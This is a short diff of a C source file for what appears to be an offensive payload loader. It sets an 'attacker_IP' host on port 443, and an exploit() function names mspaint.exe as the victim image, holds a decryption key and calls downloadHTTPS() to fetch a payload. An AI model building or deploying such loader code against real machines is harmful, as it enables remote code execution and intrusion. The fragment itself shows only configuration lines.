@@ -11,8 +11,7 @@
 #define BUFFER_SIZE 1024
 
 char buffer[BUFFER_SIZE];
-char ip[] = "192.168.56.103";
-//char ip[] = "10.11.80.155";
+char ip[] = "10.10.10.10"; //attacker_IP
 int port = 443;
 
 
@@ -55,8 +54,6 @@ void exploit()
     char key[] = "YoloSpaceHacker";
     LPCSTR victimImage = "c:\\windows\\system32\\mspaint.exe";
     
-
-
     int nb = downloadHTTPS();
     //printf("%d\n", nb);
 
